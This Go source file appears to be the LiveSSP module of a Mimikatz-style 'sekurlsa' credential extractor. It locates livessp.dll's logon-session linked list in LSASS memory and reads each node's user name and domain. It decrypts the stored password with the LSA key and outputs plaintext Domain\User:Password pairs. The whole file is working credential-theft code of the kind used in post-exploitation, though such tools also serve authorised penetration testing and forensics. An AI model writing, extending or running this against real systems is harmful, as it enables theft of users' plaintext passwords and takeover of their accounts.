package sekurlsa

import (
	"encoding/binary"
	"fmt"
)

// LiveSSPLayout captures per-build offsets inside a single
// KIWI_LIVESSP_LIST_ENTRY node. LiveSSP (livessp.dll, Win 8 — Win 10
// early) is the legacy Microsoft Account SSP — mostly superseded by
// CloudAP from Win 10 forward. Set NodeSize=0 to disable.
type LiveSSPLayout struct {
	NodeSize uint32

	// LUID — locally-unique session id.
	LUIDOffset uint32

	// UNICODE_STRING fields. Domain is typically "MicrosoftAccount".
	UserNameOffset uint32
	DomainOffset   uint32

	// PasswordOffset — UNICODE_STRING with encrypted Buffer.
	PasswordOffset uint32
}

// LiveSSPCredential is the credential payload extracted from a
// single LiveSSP logon session — the legacy Microsoft Account flow
// before CloudAP took over. Password is plaintext after LSA decrypt.
type LiveSSPCredential struct {
	UserName    string
	LogonDomain string
	Password    string
	Found       bool
}

// AuthPackage satisfies the Credential interface.
func (LiveSSPCredential) AuthPackage() string { return "LiveSSP" }

// String renders Domain\User:Password — same shape as
// WdigestCredential / TSPkgCredential for log uniformity.
func (c LiveSSPCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	return fmt.Sprintf("%s:%s", user, c.Password)
}

// wipe satisfies the optional wipe interface.
func (c *LiveSSPCredential) wipe() {
	c.Password = ""
	c.Found = false
}

// extractLiveSSP walks livessp.dll's KIWI_LIVESSP_LIST_ENTRY list
// and returns one LiveSSPCredential per LUID. Returns (nil, nil)
// without warning when the template lacks LiveSSP support.
func extractLiveSSP(r *reader, mod Module, t *Template, lsaKey *lsaKey) (map[uint64]*LiveSSPCredential, []string) {
	if t.LiveSSPLayout.NodeSize == 0 || len(t.LiveSSPListPattern) == 0 {
		return nil, nil
	}
	listHead, err := resolveListHead(r, mod,
		t.LiveSSPListPattern, t.LiveSSPListWildcards, t.LiveSSPListOffset)
	if err != nil {
		return nil, []string{fmt.Sprintf("LiveSSP list head: %v", err)}
	}
	creds := make(map[uint64]*LiveSSPCredential)
	const maxNodes = 256
	warnings := walkLinkedList(r, listHead, t.LiveSSPLayout.NodeSize, maxNodes,
		func(node []byte, _ uint64) string {
			cred, luid, warn := decodeLiveSSPNode(r, node, t.LiveSSPLayout, lsaKey)
			if warn != "" {
				return warn
			}
			if cred.Found {
				c := cred
				creds[luid] = &c
			}
			return ""
		})
	return creds, warnings
}

// decodeLiveSSPNode projects a node-bytes blob through the layout
// and decrypts the password.
func decodeLiveSSPNode(r *reader, node []byte, layout LiveSSPLayout, lsaKey *lsaKey) (LiveSSPCredential, uint64, string) {
	if uint32(len(node)) < layout.NodeSize {
		return LiveSSPCredential{}, 0, fmt.Sprintf("LiveSSP node too small: %d < %d", len(node), layout.NodeSize)
	}

	luid := uint64(0)
	if layout.LUIDOffset+8 <= layout.NodeSize {
		luid = binary.LittleEndian.Uint64(node[layout.LUIDOffset : layout.LUIDOffset+8])
	}
	username := readUnicodeStringIfFits(r, node, layout.UserNameOffset, layout.NodeSize)
	domain := readUnicodeStringIfFits(r, node, layout.DomainOffset, layout.NodeSize)

	var password string
	if layout.PasswordOffset+16 <= layout.NodeSize {
		password, _ = readEncryptedPassword(r, node[layout.PasswordOffset:layout.PasswordOffset+16], lsaKey)
	}

	cred := LiveSSPCredential{
		UserName:    username,
		LogonDomain: domain,
		Password:    password,
		Found:       password != "",
	}
	return cred, luid, ""
}

// mergeLiveSSP grafts LiveSSP credentials onto matching
// LogonSessions by LUID, mirroring the other merge helpers.
func mergeLiveSSP(sessions []LogonSession, live map[uint64]*LiveSSPCredential) []LogonSession {
	return mergeByLUID(sessions, live, func(luid uint64, c *LiveSSPCredential) LogonSession {
		return LogonSession{
			LUID:        luid,
			UserName:    c.UserName,
			LogonDomain: c.LogonDomain,
			Credentials: []Credential{c},
		}
	})
}
